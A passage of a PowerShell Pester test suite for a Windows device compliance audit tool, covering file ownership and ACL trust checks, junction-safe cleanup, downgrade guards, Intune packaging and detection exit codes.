        Mock Get-Acl { if ($LiteralPath -like '*status.json') { New-TestOwnerAcl -Sid $global:TestStatusOwner -Rules $global:TestStatusRules } else { New-TestOwnerAcl -Sid $global:TestRootOwner -Rules $global:TestRootRules } }
        try {
            Get-CEStatusTrustProblem -DataRoot $root | Should -BeNullOrEmpty
            (Get-CEComplianceData -DataRoot $root -Installed $true -Elevated $true -NoKick).CEAutoFailCount | Should -BeGreaterThan 0

            $global:TestStatusOwner = 'S-1-5-21-1-2-3-1001'
            Get-CEStatusTrustProblem -DataRoot $root | Should -Match 'status\.json is owned by S-1-5-21-1-2-3-1001'
            $data = Get-CEComplianceData -DataRoot $root -Installed $true -Elevated $true -NoKick
            $data.CEAutoFailCount | Should -Be -1 -Because 'an untrusted status counts as no data'
            $data.CEToolVersion | Should -Be '0.0.0'
            (Get-CEComplianceData -DataRoot $root -Installed $true -Elevated $false -NoKick).CEAutoFailCount | Should -BeGreaterThan 0 -Because 'a standard user can only mislead themselves'

            $global:TestStatusOwner = 'S-1-5-18'
            $global:TestRootOwner = 'S-1-5-21-1-2-3-1001'
            Get-CEStatusTrustProblem -DataRoot $root | Should -Match 'owned by S-1-5-21-1-2-3-1001'

            $global:TestRootOwner = 'S-1-5-18'
            # An administrator owner is not enough: a hard link to the user's own ntuser.ini has one.
            $global:TestStatusRules = $locked + @(New-TestRule -Sid 'S-1-5-21-1-2-3-1001' -Rights FullControl)
            Get-CEStatusTrustProblem -DataRoot $root | Should -Match 'status\.json can be changed by S-1-5-21-1-2-3-1001'
            (Get-CEComplianceData -DataRoot $root -Installed $true -Elevated $true -NoKick).CEAutoFailCount | Should -Be -1
            $global:TestStatusRules = $locked + @(New-TestRule -Sid 'S-1-5-32-545' -Rights ReadAndExecute) + @(New-TestRule -Sid 'S-1-5-32-545' -Rights Write -Type Deny)
            Get-CEStatusTrustProblem -DataRoot $root | Should -BeNullOrEmpty -Because 'reading it, or a standard user being denied, is not changing it'
            # A deny against SYSTEM or Administrators is tampering: it could stop the audit replacing a forged status.json.
            $global:TestStatusRules = $locked + @(New-TestRule -Sid 'S-1-5-18' -Rights ([Security.AccessControl.FileSystemRights]'CreateFiles, Delete') -Type Deny)
            Get-CEStatusTrustProblem -DataRoot $root | Should -Match 'denies S-1-5-18' -Because 'the audit could be blocked from replacing status.json'
            $global:TestStatusRules = $locked
            $global:TestRootRules = $locked + @(New-TestRule -Sid 'S-1-5-32-545' -Rights Delete)
            Get-CEStatusTrustProblem -DataRoot $root | Should -Match 'can be changed by S-1-5-32-545' -Because 'whoever can delete the folder can put another in its place'
            $global:TestRootRules = $locked + @(New-TestRule -Sid 'S-1-3-0' -Rights FullControl)
            Get-CEStatusTrustProblem -DataRoot $root | Should -BeNullOrEmpty -Because 'CREATOR OWNER only applies to new items'
            $global:TestRootRules = $locked

            Get-CEStatusTrustProblem -DataRoot $link | Should -Match 'is a link' -Because 'a locked junction still leads to a folder the user owns'
            (Get-CEComplianceData -DataRoot $link -Installed $true -Elevated $true -NoKick).CEAutoFailCount | Should -Be -1
        }
        finally { [IO.Directory]::Delete($link, $false) }

        # The detection script checks before reading status.json, and says why it fails.
        $text = (Get-Content -LiteralPath (Join-Path $script:intune 'Detect-CECompliance.ps1') -Raw) -replace '\r\n', "`n"
        $check = [regex]::Match($text, '(?m)^if \(\$elevated\) \{\n    \$problem = Get-CEStatusTrustProblem -DataRoot \$dataRoot\n    if \(\$problem\) \{\n        Write-Output "UNTRUSTED: [^\n]*\n        exit 1\n    \}\n\}')
        $check.Success | Should -BeTrue
        $check.Index | Should -BeLessThan $text.IndexOf('Get-Content -LiteralPath $statusPath')
        # Nothing takes a folder back any more, and nothing needs reinstalling: exit 1 runs the remediation
        # script, whose SYSTEM audit moves an untrusted data folder aside and writes a fresh status.json.
        $check.Value | Should -Not -Match 'Reinstall|take the folder back'
        $check.Value | Should -Match 'next SYSTEM audit'
        $check.Value | Should -Match 'EngramicBaseline\.untrusted-'
    }

    It 'the deployment rehearsal makes nothing in the data folder before the install, and cleans up without following links' {
        # It made <data folder>\deployment-test before installing, which on a fresh device made the data
        # folder unlocked: the install then moved it aside, the SYSTEM helper's folder was gone and every
        # later step failed. Its clean-up was an elevated Remove-Item -Recurse, which follows junctions on 5.1.
        $path = Join-Path $script:intune 'Test-IntuneDeployment.ps1'
        $raw = Get-Content -LiteralPath $path -Raw
        $installed = $raw.IndexOf("if (`$p.ExitCode -ne 0) { throw 'Install failed; stopping.' }")
        $installed | Should -BeGreaterThan 0
        $ast = [System.Management.Automation.Language.Parser]::ParseFile($path, [ref]$null, [ref]$null)
        $writers = @('New-Item', 'Set-Content', 'Add-Content', 'Out-File', 'Copy-Item', 'Move-Item', 'Initialize-CEDataFolder')
        $early = @($ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.CommandAst] -and $writers -contains $n.GetCommandName() }, $true) |
            Where-Object { $_.Extent.StartOffset -lt $installed -and $_.Extent.Text -match '\$(workDir|dataRoot)\b' } | ForEach-Object { $_.Extent.Text })
        $early | Should -BeNullOrEmpty -Because 'nothing may make the data folder before the install creates it locked'
        $raw.IndexOf('$workDir = Initialize-CEDataFolder -Path $workDir') | Should -BeGreaterThan $installed -Because 'its own folder is made after the install, the locked way'
        $text = $raw -replace '\r\n', "`n"
        $finally = [regex]::Match($text, '(?ms)^finally \{.*?\n\}').Value
        $finally | Should -Match 'if \(\$workDirReady\) \{'
        $finally | Should -Match 'Remove-CEDataTree -Path \$workDir'
        $text | Should -Not -Match 'Remove-Item[^\n]*\$workDir' -Because 'Remove-Item -Recurse follows junctions on Windows PowerShell 5.1'
        # A config override staged in the package is checked for after the install: there, unchanged, and
        # administrator-owned, since the SYSTEM audit ignores a config file SYSTEM or Administrators do not own.
        $stagedCheck = $raw.IndexOf("Add-Step 'Config overrides staged in the package deployed'")
        $stagedCheck | Should -BeGreaterThan $installed
        $check = $raw.Substring($raw.LastIndexOf('$staged = @(', $stagedCheck), $stagedCheck - $raw.LastIndexOf('$staged = @(', $stagedCheck))
        $check | Should -Match 'Get-FileHash'
        $check | Should -Match "@\('S-1-5-18', 'S-1-5-32-544'\) -notcontains \(Get-Acl -LiteralPath \`$deployed\)\.GetOwner\(\[Security\.Principal\.SecurityIdentifier\]\)\.Value"
    }

    It 'CI and its sandbox mirror stage the rehearsal''s config override in the package, never in the data folder before the install' {
        # A file put in %ProgramData%\EngramicBaseline before the install makes the data folder there, unlocked;
        # the install moves it aside and the override (here the Windows Update skip) is lost with it.
        $ci = Get-Content -LiteralPath (Join-Path (Join-Path (Join-Path $script:RepoRoot '.github') 'workflows') 'ci.yml') -Raw
        $mirror = Get-Content -LiteralPath (Join-Path (Join-Path (Join-Path $script:RepoRoot 'tools') 'sandbox') 'Invoke-SandboxCI.ps1') -Raw
        foreach ($t in @($ci, $mirror)) {
            $t | Should -Not -Match "Join-Path \`$env:ProgramData 'EngramicBaseline"
            $t | Should -Match "Join-Path \(Get-Location\) 'data\\config'"
            # The package is built without the rehearsal's CI-only override.
            $t | Should -Match 'Remove-Item -LiteralPath \./data -Recurse -Force -ErrorAction SilentlyContinue\r?\n\s*\./intune/Build-IntunePackage\.ps1 -DownloadTool'
        }
        $ci.IndexOf('Remove-Item -LiteralPath ./data') | Should -BeGreaterThan $ci.IndexOf('run: ./intune/Test-IntuneDeployment.ps1') -Because 'only after the rehearsal'
        $mirror | Should -Match "-Name 'Build the Intune package' -Shell 'powershell\.exe' -Script \`$build"
        $mirror | Should -Match "/XD \.git output build \.playwright-mcp 'C:\\baseline-tool\\data'" -Because 'the mirror starts from a checkout with no staged overrides, as CI does'
    }

    It 'the install never puts an older version over a newer one: <Installed> installed, package <Package>' -ForEach @(
        @{ Installed = '0.3.3'; Package = '0.3.2'; Newer = $true }
        @{ Installed = '0.3.10'; Package = '0.3.9'; Newer = $true }
        @{ Installed = '1.0'; Package = '0.9.9'; Newer = $true }
        @{ Installed = '0.3.2'; Package = '0.3.2'; Newer = $false }
        @{ Installed = '0.3.1'; Package = '0.3.2'; Newer = $false }
        @{ Installed = ''; Package = '0.3.2'; Newer = $false }
        @{ Installed = 'not a version'; Package = '0.3.2'; Newer = $false }
    ) {
        $installer = Join-Path $script:intune 'Install-CEChecker.ps1'
        $ast = [System.Management.Automation.Language.Parser]::ParseFile($installer, [ref]$null, [ref]$null)
        $fn = $ast.Find({ param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] -and $n.Name -eq 'Test-CENewerInstalled' }, $true)
        $fn | Should -Not -BeNullOrEmpty
        . ([scriptblock]::Create($fn.Extent.Text))
        Test-CENewerInstalled -Installed $Installed -Package $Package | Should -Be $Newer

        # The check reads the detection value and stops before anything is copied or an audit
        # starts. -AllowDowngrade overrides it and reaches the 64-bit relaunch.
        (Get-Command $installer).Parameters['AllowDowngrade'].ParameterType | Should -Be ([switch])
        $text = (Get-Content -LiteralPath $installer -Raw) -replace '\r\n', "`n"
        $guard = [regex]::Match($text, '(?m)^    if \(-not \$AllowDowngrade -and \(Test-CENewerInstalled -Installed \$installedVersion -Package \$version\)\) \{\n[^\n]*Write-Warning[^\n]*\n        exit 0\n    \}')
        $guard.Success | Should -BeTrue
        $text | Should -Match "(?m)^    \`$installedItem = Get-ItemProperty -LiteralPath \`$regPath -ErrorAction SilentlyContinue\n    if \(\`$installedItem -and \`$installedItem\.PSObject\.Properties\['Version'\]\) \{ \`$installedVersion = \[string\]\`$installedItem\.Version \}\n    if \(-not \`$AllowDowngrade"
        $guard.Index | Should -BeGreaterThan $text.IndexOf('$version = [string]$manifest.ModuleVersion')
        foreach ($later in @('New-Item -ItemType Directory -Path $staging', 'Remove-Item -LiteralPath $InstallPath', 'Register-ScheduledTask', 'New-ItemProperty -Path $regPath', 'Start-ScheduledTask')) {
            $text.IndexOf($later) | Should -BeGreaterThan $guard.Index -Because "$later comes after the downgrade check"
        }
    }

    It 'the build takes a relative -OutputPath from the PowerShell location, not the process directory' {
        $pwshExe = (Get-Process -Id $PID).Path
        $buildPath = Join-Path $script:intune 'Build-IntunePackage.ps1'
        $fakeDir = Join-Path $TestDrive 'fake iwau'
        New-Item -ItemType Directory -Path $fakeDir -Force | Out-Null
        $fake = Join-Path $fakeDir 'IntuneWinAppUtil.cmd'
        # Stands in for IntuneWinAppUtil: -c <payload> -s <setup> -o <output> -q.
        Set-Content -LiteralPath $fake -Encoding Ascii -Value @('@echo off', 'echo package> "%~6\Install-CEChecker.intunewin"')
        $here = Join-Path $TestDrive 'build-here'
        $elsewhere = Join-Path $TestDrive 'process-dir'
        New-Item -ItemType Directory -Path $here, $elsewhere -Force | Out-Null
        $cmd = "[Environment]::CurrentDirectory = '$elsewhere'; Set-Location -LiteralPath '$here'; & '$buildPath' -OutputPath '.\rel-build' -IntuneWinAppUtilPath '$fake'; exit [int](-not `$?)"
        $log = Join-Path $TestDrive 'intune-build-rel.log'
        # Windows PowerShell turns redirected native output on stderr into error records; the exit code is what is tested.
        & { $ErrorActionPreference = 'Continue'; & $pwshExe -NoProfile -ExecutionPolicy Bypass -Command $cmd *> $log }
        $LASTEXITCODE | Should -Be 0 -Because (Get-Content $log -Raw)
        $out = Join-Path $here 'rel-build'
        Test-Path -LiteralPath (Join-Path (Join-Path $out 'upload') 'Detect-CEChecker.ps1') | Should -BeTrue
        @(Get-ChildItem -LiteralPath $out -Filter 'EngramicBaseline-*.intunewin').Count | Should -Be 1
        Test-Path -LiteralPath (Join-Path $elsewhere 'rel-build') | Should -BeFalse
        (Get-Content $log -Raw) | Should -Match ([regex]::Escape("Next: follow $(Join-Path $out 'INTUNE-SETTINGS.md')")) -Because 'it prints the full path'
    }

    It 'Remediations detection prints a summary and exits 1 when not ready, 0 when ready' {
        $pwshExe = (Get-Process -Id $PID).Path
        $detect = Join-Path $script:intune 'Detect-CECompliance.ps1'
        $bad = Join-Path $TestDrive 'pd-bad'
        New-TestStatus -Kind Insecure -DataRoot (Join-Path $bad 'EngramicBaseline') | Out-Null
        $good = Join-Path $TestDrive 'pd-good'
        New-TestStatus -Kind Secure -DataRoot (Join-Path $good 'EngramicBaseline') -AttestMfa | Out-Null
        # A device that is ready, except (below) for a run that failed after it.
        $okData = Join-Path (Join-Path $TestDrive 'pd-ok') 'EngramicBaseline'
        New-Item -ItemType Directory -Force -Path $okData | Out-Null
        [ordered]@{ auditTime = [datetime]::UtcNow.ToString('o'); autoFailCount = 0; autoFails = @(); toolVersion = '1.0.0'; checks = [ordered]@{ 'FW-01' = @{ status = 'Pass' } } } |
            ConvertTo-Json -Depth 4 | Set-Content -LiteralPath (Join-Path $okData 'status.json') -Encoding UTF8
        $lastError = Join-Path $okData 'last-error.json'
        Set-Content -LiteralPath $lastError -Value '{ "Message": "Access to the path is denied." }'
        if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
            # Elevated (as in CI), the script only reads a status.json that administrators own and only
            # they can change, as the SYSTEM audit's is.
            foreach ($dir in @((Join-Path $bad 'EngramicBaseline'), (Join-Path $good 'EngramicBaseline'), $okData)) {
                foreach ($p in @(@($dir) + @(Get-ChildItem -LiteralPath $dir -File | ForEach-Object { $_.FullName }))) {
                    $acl = Get-Acl -LiteralPath $p
                    $acl.SetOwner([Security.Principal.SecurityIdentifier]::new('S-1-5-32-544'))
                    $acl.SetAccessRuleProtection($true, $false)
                    foreach ($r in @($acl.GetAccessRules($true, $false, [Security.Principal.SecurityIdentifier]))) { [void]$acl.RemoveAccessRuleSpecific($r) }
                    $inherit = if ($p -eq $dir) { [Security.AccessControl.InheritanceFlags]'ContainerInherit, ObjectInherit' } else { [Security.AccessControl.InheritanceFlags]::None }
                    foreach ($sid in @('S-1-5-18', 'S-1-5-32-544')) {
                        $acl.AddAccessRule((New-Object Security.AccessControl.FileSystemAccessRule((New-Object Security.Principal.SecurityIdentifier($sid)), 'FullControl', $inherit, 'None', 'Allow')))
                    }
                    Set-Acl -LiteralPath $p -AclObject $acl
                }
            }
        }

        $saved = $env:ProgramData
        try {
            $env:ProgramData = $bad
            $out = & $pwshExe -NoProfile -File $detect
            $LASTEXITCODE | Should -Be 1
            "$out" | Should -Match '^AUTO-FAIL \| autofail=[1-9]'
            $env:ProgramData = $good
            $out = & $pwshExe -NoProfile -File $detect
            "$out" | Should -Match '^(OK|REVIEW|ATTENTION)'
            if ("$out" -like 'OK*') { $LASTEXITCODE | Should -Be 0 } else { $LASTEXITCODE | Should -Be 1 }
            $env:ProgramData = Join-Path $TestDrive 'pd-none'
            $out = & $pwshExe -NoProfile -File $detect
            $LASTEXITCODE | Should -Be 1
            "$out" | Should -Match '^NO_DATA'

            # A run that failed after status.json was written: status.json may not be current, and a
            # user who stopped every audit could otherwise keep an old one looking ready.
            $env:ProgramData = Join-Path $TestDrive 'pd-ok'
            (Get-Item -LiteralPath $lastError).LastWriteTimeUtc = [datetime]::UtcNow.AddMinutes(5)
            $out = & $pwshExe -NoProfile -File $detect
            "$out" | Should -Match '^LAST_RUN_ERROR \| OK \|'
            $LASTEXITCODE | Should -Be 1
            # One left from before the last good run changes nothing.
            (Get-Item -LiteralPath $lastError).LastWriteTimeUtc = [datetime]::UtcNow.AddHours(-5)
            $out = & $pwshExe -NoProfile -File $detect
            "$out" | Should -Match '^LAST_RUN_ERROR \| OK \|'
            $LASTEXITCODE | Should -Be 0
            Remove-Item -LiteralPath $lastError
            $out = & $pwshExe -NoProfile -File $detect
            "$out" | Should -Match '^OK \|'
            $LASTEXITCODE | Should -Be 0
        }
        finally { $env:ProgramData = $saved }
    }
}

Describe 'Headless scheduled audit' {
    It 'runs end to end in a fresh process and writes status, report and log' {
        $pwshExe = (Get-Process -Id $PID).Path
        $root = Join-Path $TestDrive 'headless'
        # Keep the test offline: turn the firmware catalog off through the data-root config override.
        New-Item -ItemType Directory -Path (Join-Path $root 'config') -Force | Out-Null
        Get-Content (Join-Path (Join-Path $script:RepoRoot 'config') 'firmware-catalog.json') -Raw | ConvertFrom-Json |
            ForEach-Object { $_.baseUrl = ''; $_ } | ConvertTo-Json | Set-Content (Join-Path (Join-Path $root 'config') 'firmware-catalog.json') -Encoding UTF8
        & $pwshExe -NoProfile -File (Join-Path $script:RepoRoot 'app\Invoke-CEScheduledAudit.ps1') -DataRoot $root *> $null
        $LASTEXITCODE | Should -Be 0
        $status = Get-Content (Join-Path $root 'status.json') -Raw | ConvertFrom-Json
        $status.SchemaVersion | Should -Be 1
        # SYSTEM runs Machine-scope checks only; shadow-AI/WSL (User scope) come from Invoke-CEUserProbe.ps1.
        @($status.Checks.PSObject.Properties).Count | Should -Be @(Get-CECheck -Scope 'Machine').Count
        $status.Checks.PSObject.Properties.Name | Should -Not -Contain 'UA-10'
        Test-Path (Join-Path $status.ReportFolder 'report.html') | Should -BeTrue
        @(Get-ChildItem (Join-Path $root 'logs') -Filter 'audit-*.log').Count | Should -Be 1
        Test-Path (Join-Path $root 'last-error.json') | Should -BeFalse
    }

    It 'deletes old report folders without following a link that one contains' {
        # SYSTEM housekeeping under the data folder must not follow a junction (Remove-Item -Recurse
        # does on 5.1), or it could empty a folder the link points at.
        $root = Join-Path $TestDrive 'housekeep'
        $reports = Join-Path $root 'reports'
        $outside = Join-Path $TestDrive 'housekeep-outside'
        New-Item -ItemType Directory -Force -Path $reports, $outside | Out-Null
        Set-Content -LiteralPath (Join-Path $outside 'keep.txt') -Value 'keep'
        # 16 report folders, oldest first; the newest 14 are kept, so the two oldest are removed.
        $old = 1..16 | ForEach-Object { $d = Join-Path $reports ('PC-2026010{0:00}-000000' -f $_); New-Item -ItemType Directory -Path $d -Force | Out-Null; $d }
        $link = Join-Path $old[0] 'to-outside'
        New-Item -ItemType Junction -Path $link -Target $outside | Out-Null
        # As a standard user here; the elevated per-folder trust check has its own test below. (Elevated,
        # as in CI, these test folders inherit the runner account's write access and would be left.)
        Mock -ModuleName CEAudit Test-CEIsAdmin { $false }
        try {
            Get-ChildItem -LiteralPath $reports -Directory | Sort-Object Name -Descending | Select-Object -Skip 14 |
                ForEach-Object { Remove-CEDataTree -Path $_.FullName | Out-Null }
            Test-Path -LiteralPath $old[0] | Should -BeFalse -Because 'the oldest report folder is removed'
            Test-Path -LiteralPath $old[1] | Should -BeFalse
            @(Get-ChildItem -LiteralPath $reports -Directory).Count | Should -Be 14
            Get-Content -LiteralPath (Join-Path $outside 'keep.txt') | Should -Be 'keep' -Because 'the junction inside a deleted folder was not followed'
        }
        finally { if ((Test-Path -LiteralPath $link) -and ((Get-Item -LiteralPath $link -Force).Attributes -band [IO.FileAttributes]::ReparsePoint)) { [IO.Directory]::Delete($link, $false) } }
    }

    It 'report housekeeping as administrator never lists a folder a standard user controls, or a quarantine' {
        # The recursive delete checked nothing below the folder it was given. As administrator or SYSTEM it
        # now checks each folder immediately before listing it: one that is a link, not admin-owned, or
        # changeable by a non-administrator is left in place unread, so no entry in a folder it walks can be
        # swapped for a junction. A *.untrusted-* quarantine is left for an administrator.
        $old = Join-Path $TestDrive 'housekeep-trust\reports\PC-20260101-000000'
        $userDir = Join-Path $old 'A'
        $quarantine = Join-Path $old 'x.untrusted-0123'
        $outside = Join-Path $TestDrive 'housekeep-trust-outside'
        New-Item -ItemType Directory -Force -Path $userDir, (Join-Path $old 'ok'), $quarantine, $outside | Out-Null
        Set-Content -LiteralPath (Join-Path $old 'ok\report.html') -Value '<html/>'
        Set-Content -LiteralPath (Join-Path $userDir 'zz-sentinel.txt') -Value 'mine'
        Set-Content -LiteralPath (Join-Path $quarantine 'q.txt') -Value 'quarantined'
        Set-Content -LiteralPath (Join-Path $outside 'zz-sentinel.txt') -Value 'target'
        $userLink = Join-Path $userDir 'to-outside'
        New-Item -ItemType Junction -Path $userLink -Target $outside | Out-Null
        try {
            InModuleScope CEAudit -Parameters @{ Old = $old; UserDir = $userDir } {
                param($Old, $UserDir)
                Mock Test-CEIsAdmin { $true }
                Mock Get-CELockedFolderProblem { if ($Path -eq $UserDir) { "$Path is owned by S-1-5-21-1-2-3-1001" } else { '' } }
                Remove-CEDataTree -Path $Old -WarningVariable w -WarningAction SilentlyContinue | Should -BeFalse -Because 'something was left in place'
                Should -Invoke Get-CELockedFolderProblem -Times 1 -Exactly -ParameterFilter { $Path -eq $UserDir } -Because 'each folder is checked just before it would be listed'
                Should -Invoke Get-CELockedFolderProblem -Times 0 -ParameterFilter { $Path -like '*.untrusted-*' } -Because 'a quarantine is not even read'
                "$w" | Should -Match ([regex]::Escape($UserDir))
            }
            Test-Path -LiteralPath (Join-Path $old 'ok') | Should -BeFalse -Because 'trusted folders are removed'
            Get-Content -LiteralPath (Join-Path $userDir 'zz-sentinel.txt') | Should -Be 'mine' -Because 'an untrusted folder is never listed or walked'
            Test-Path -LiteralPath $userLink | Should -BeTrue
            Get-Content -LiteralPath (Join-Path $quarantine 'q.txt') | Should -Be 'quarantined'
            Get-Content -LiteralPath (Join-Path $outside 'zz-sentinel.txt') | Should -Be 'target'
        }
        finally { if ((Test-Path -LiteralPath $userLink) -and ([IO.File]::GetAttributes($userLink) -band [IO.FileAttributes]::ReparsePoint)) { [IO.Directory]::Delete($userLink, $false) } }

        # A standard user's own housekeeping needs no check: it can only delete what that user could anyway.
        $mine = Join-Path $TestDrive 'housekeep-user\PC-20260101-000000'
        New-Item -ItemType Directory -Force -Path (Join-Path $mine 'sub') | Out-Null
        Set-Content -LiteralPath (Join-Path $mine 'sub\f.txt') -Value 'x'
        InModuleScope CEAudit -Parameters @{ Mine = $mine } {
            param($Mine)
            Mock Test-CEIsAdmin { $false }
            Mock Get-CELockedFolderProblem { throw 'not checked for a standard user' }
            Remove-CEDataTree -Path $Mine | Should -BeTrue
        }
        Test-Path -LiteralPath $mine | Should -BeFalse
    }

    It 'writes the audit event through the one ReportEvent writer, with the documented IDs' {
        # Write-CEEventLog and the data-folder move-aside notice share Write-CEEventEntry (RegisterEventSource
        # and ReportEvent, never EventLog.WriteEntry): 1000 clean, 1001 attention, 1002 auto-fail, 1003 moved aside.
        InModuleScope CEAudit {
            Mock Test-Path { $true }
            Mock Write-CEEventEntry { }
            Write-CEEventLog -Status ([pscustomobject]@{ autoFailCount = 2; autoFails = @('SU-03'); checks = [ordered]@{}; frameworks = [ordered]@{}; reportFolder = 'X' })
            Should -Invoke Write-CEEventEntry -Times 1 -Exactly -ParameterFilter { $Id -eq 1002 -and $Type -eq 'Error' -and $Message -like 'Engramic Baseline device audit*' }
            Write-CEEventLog -Status ([pscustomobject]@{ autoFailCount = 0; autoFails = @(); checks = [ordered]@{ 'FW-01' = [ordered]@{ status = 'Fail' } }; frameworks = [ordered]@{}; reportFolder = 'X' })
            Should -Invoke Write-CEEventEntry -Times 1 -Exactly -ParameterFilter { $Id -eq 1001 -and $Type -eq 'Warning' }
            Write-CEEventLog -Status ([pscustomobject]@{ autoFailCount = 0; autoFails = @(); checks = [ordered]@{ 'FW-01' = [ordered]@{ status = 'Pass' } }; frameworks = [ordered]@{}; reportFolder = 'X' })
            Should -Invoke Write-CEEventEntry -Times 1 -Exactly -ParameterFilter { $Id -eq 1000 -and $Type -eq 'Information' }
        }
    }

    It 'takes the audit mutex before it sets up the data folder, inside the error handling' {
        # The mutex must be held before Initialize-CEDataFolder so an upgrade never runs underneath the
        # audit, and the folder setup must be inside the try so a failure is recorded, not silent.
        $text = (Get-Content -LiteralPath (Join-Path $script:RepoRoot 'app\Invoke-CEScheduledAudit.ps1') -Raw) -replace '\r\n', "`n"
        $wait = $text.IndexOf('$mutex.WaitOne(')
        $init = $text.IndexOf('foreach ($d in @($DataRoot, $reportRoot, $logRoot)) { Initialize-CEDataFolder')
        $wait | Should -BeGreaterThan 0
        $init | Should -BeGreaterThan 0
        $wait | Should -BeLessThan $init -Because 'the mutex is taken before the data folder is touched'
        # The try that contains the folder setup opens after the mutex is held.
        $mainTry = $text.LastIndexOf("`ntry {", $init)
        $mainTry | Should -BeGreaterThan $wait -Because 'the folder setup is inside the try opened after the mutex, so a failure is recorded'
    }

    It 'only runs report/log housekeeping and writes last-error.json when the data folders were set up' {
        # Finding 2: if Initialize-CEDataFolder throws (which is exactly when $DataRoot / $reportRoot may
        # be a junction a standard user controls), the finally-block housekeeping and the catch's
        # last-error.json write must NOT run - otherwise a SYSTEM delete follows the user's junction, or a
        # SYSTEM write lands through it. Both are gated on $foldersReady, set true only after setup.
        $text = (Get-Content -LiteralPath (Join-Path $script:RepoRoot 'app\Invoke-CEScheduledAudit.ps1') -Raw) -replace '\r\n', "`n"
        # $foldersReady starts false, before the try that sets the folders up.
        $init = $text.IndexOf('Initialize-CEDataFolder -Path $d')
        $init | Should -BeGreaterThan 0
        $mainTry = $text.LastIndexOf("`ntry {", $init)
        $declare = $text.IndexOf('$foldersReady = $false')
        $declare | Should -BeGreaterThan 0
        $declare | Should -BeLessThan $mainTry -Because 'it must be false until setup succeeds'
        # It is set true only after Initialize-CEDataFolder has run for all three folders.
        $setTrue = $text.IndexOf('$foldersReady = $true')
        $setTrue | Should -BeGreaterThan $init -Because 'set only after the folders are set up'
        # The catch writes last-error.json only under the guard (anchor on the actual write, not the
        # explanatory comment that also names last-error.json).
        $catchIdx = $text.IndexOf("`ncatch {")
        $guardInCatch = $text.IndexOf('if ($foldersReady) {', $catchIdx)
        $lastErrorWrite = $text.IndexOf('Write-CEAuditFailure -DataRoot $DataRoot', $catchIdx)
        $guardInCatch | Should -BeGreaterThan $catchIdx
        $lastErrorWrite | Should -BeGreaterThan $guardInCatch -Because 'last-error.json is written only into a data root that was set up'
        # The finally runs housekeeping only under the guard.
        $finallyIdx = $text.IndexOf("`nfinally {")
        $guardInFinally = $text.IndexOf('if ($foldersReady) {', $finallyIdx)
        $house = $text.IndexOf('Remove-CEDataTree', $finallyIdx)
        $guardInFinally | Should -BeGreaterThan $finallyIdx
        $guardInFinally | Should -BeLessThan $house -Because 'old report folders are deleted only when the folders were set up and trusted'
        # The old comment that claimed it writes last-error.json "even" into an untrusted root is gone.
        $text | Should -Not -Match "don't create last-error.json in a folder we don't trust" -Because 'the comment now matches the guarded code'
    }
}

Describe 'Counting failed machine audits (last-error.json)' {
    It 'reads the previous last-error.json only when trusted, and moves an untrusted one OUT of the data folder instead' {
        $pd = Join-Path $TestDrive 'pd-failcount'
        $root = Join-Path $pd 'EngramicBaseline'
        New-Item -ItemType Directory -Force -Path $root | Out-Null
        $errPath = Join-Path $root 'last-error.json'
        InModuleScope CEAudit -Parameters @{ Root = $root; Pd = $pd; ErrPath = $errPath } {
            param($Root, $Pd, $ErrPath)
            $script:CEDataRootOverride = $Root
            try {
                Mock Test-CEIsWindows { $true }
                Mock Test-CEIsAdmin { $true }
                Mock Write-CEEventEntry { }
                $global:TestUntrustedLastError = $false
                $global:TestUntrustedRoot = $false
                Mock Get-CEDataPathProblem {
                    if ($global:TestUntrustedLastError -and $Path -like '*last-error.json') { "$Path is owned by S-1-5-21-1-2-3-1001" }
                    elseif ($global:TestUntrustedRoot -and $Path -like '*EngramicBaseline') { "$Path is owned by S-1-5-21-1-2-3-1001" }
                }
                $now = [datetime]::UtcNow
                (Write-CEAuditFailure -DataRoot $Root -Message 'one' -Now $now.AddHours(-3)).FailedRuns | Should -Be 1
                (Write-CEAuditFailure -DataRoot $Root -Message 'two' -Now $now.AddHours(-2)).FailedRuns | Should -Be 2
                @(Get-ChildItem -LiteralPath $Root -Filter '*.tmp' -File).Count | Should -Be 0 -Because 'written to a temporary name and renamed into place'

                # A forged count (say one a user reset to 0 so the device never flips) is not read.
                $global:TestUntrustedLastError = $true
                Set-Content -LiteralPath $ErrPath -Value '{ "FailedRuns": 0, "FirstFailure": "2099-01-01T00:00:00Z", "Message": "forged" }'
                $r = Write-CEAuditFailure -DataRoot $Root -Message 'three' -Now $now -WarningVariable w -WarningAction SilentlyContinue
                $r.FailedRuns | Should -Be 1 -Because 'an untrusted count is never carried over'
                $r.FirstFailure | Should -Be $now.ToString('o')
                $aside = @(Get-ChildItem -LiteralPath $Pd -File -Filter 'EngramicBaseline.untrusted-*-last-error.json')
                $aside.Count | Should -Be 1 -Because 'moved out of the data folder, beside it, never deleted'
                Get-Content -LiteralPath $aside[0].FullName -Raw | Should -Match 'forged'
                @(Get-ChildItem -LiteralPath $Root -Force -Filter '*.untrusted-*').Count | Should -Be 0
                "$w" | Should -Match ([regex]::Escape($aside[0].FullName))
                Should -Invoke Write-CEEventEntry -Times 1 -Exactly -ParameterFilter { $Id -eq 1003 -and $Message -like "*$($aside[0].FullName)*" }
                (Get-Content -LiteralPath $ErrPath -Raw | ConvertFrom-Json).Message | Should -Be 'three'

                # After a success an untrusted file is moved aside too, never deleted; a trusted one is removed.
                Clear-CEAuditFailure -DataRoot $Root -WarningAction SilentlyContinue
                Test-Path -LiteralPath $ErrPath | Should -BeFalse
                @(Get-ChildItem -LiteralPath $Pd -File -Filter 'EngramicBaseline.untrusted-*-last-error.json').Count | Should -Be 2
                $global:TestUntrustedLastError = $false
                Write-CEAuditFailure -DataRoot $Root -Message 'four' -Now $now | Out-Null
                Clear-CEAuditFailure -DataRoot $Root
                Test-Path -LiteralPath $ErrPath | Should -BeFalse
                @(Get-ChildItem -LiteralPath $Pd -File -Filter 'EngramicBaseline.untrusted-*-last-error.json').Count | Should -Be 2 -Because 'a trusted file is simply removed'
                Clear-CEAuditFailure -DataRoot $Root
                Should -Invoke Write-CEEventEntry -Times 2 -Exactly

                # Nothing is written into a data folder that is not trusted.
                $global:TestUntrustedRoot = $true
                { Write-CEAuditFailure -DataRoot $Root -Message 'five' -Now $now } | Should -Throw '*Did not record the failure*'
                Test-Path -LiteralPath $ErrPath | Should -BeFalse
            }
            finally {
                $script:CEDataRootOverride = $null
